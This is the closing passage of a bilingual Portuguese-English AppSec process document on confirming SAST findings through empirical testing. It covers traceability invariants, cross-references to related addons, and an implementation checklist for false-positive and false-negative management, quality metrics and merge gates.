↔️ Cross-reference: Ver [addon-11](./11-validacao-sast-assistida.md) para decision framework (Checklist C1, Decision Template T1)

**I3 — Reprodutibilidade:**  
✅ Tests versionadas (T1-T6 documented, reproducible commands)

**I4 — Proteção de ativos:**  
↔️ Hardcoded Secrets (T4) escalados imediatamente para rotation & audit

**I5 — Rastreabilidade:**  
✅ FP/FN documents with approval trail (VEX, RCA, signed by AppSec)

---

## 📎 Referências Cruzadas

| Documento | Relação |
|---|---|
| [addon-11: Validação Assistida de SAST](./11-validacao-sast-assistida.md) | I1 decision framework (works with I2 empirical testing) |
| [Cap 05 — addon-21: Validação Manual de CVEs](../../05-dependencias-sbom-sca/addon/21-validacao-manual-cves.md) | Similar I2 framework for dependency vulnerabilities (6 categories) |
| [Cap 02 — addon-07: Validação de Requisitos](../../02-requisitos-seguranca/addon/07-validacao-requisitos.md) | Similar I2 framework for requirements testing |
| [agent.md](https://github.com/your-org/agent-spec) | Invariantes I1-I5 normativas |

---

## ✅ Checklist de Implementação

- [ ] **Taxonomia & Procedures:**
  - [ ] Treinar team em T1-T6 (6 test procedures)
  - [ ] Definir tools usados (sqlmap, Burp Suite, ysoserial, etc.)
  - [ ] Documentar PoC por categoria

- [ ] **FP/FN Management:**
  - [ ] Criar processo FP: Finding → Analysis → Suppression → VEX
  - [ ] Criar processo FN: Discovery → RCA → Custom rule → Regression test
  - [ ] Arquivo de FPs: `falsos-positivos/FP-YYYY-MM-DD-*.md`
  - [ ] Arquivo de FNs: `falsos-negativos/FN-YYYY-MM-DD-*.md`

- [ ] **Quality Metrics:**
  - [ ] Setup dashboard: FP rate, FN rate, time-to-validation
  - [ ] Define thresholds (tool replacement if FP >40%)
  - [ ] Monthly review de métricas

- [ ] **Integration:**
  - [ ] Link addon-11 (Decision) com addon-12 (Evidence)
  - [ ] Merge gate: L2/L3 findings require both C1 checklist + empirical test
  - [ ] Training: "How to validate a finding" (T1-T6 procedures)

- [ ] **Processo Contínuo:**
  - [ ] 3-month review: FP/FN trends, tool effectiveness
  - [ ] Update T1-T6 with new attack patterns
  - [ ] Quarterly SAST rule audit (disabled rules, why?)

---

> 📌 **Princípio central:** Evidence-driven decisions.  
> SAST suggests, Empirical testing confirms.  
> FP/FN management ensures tool quality.
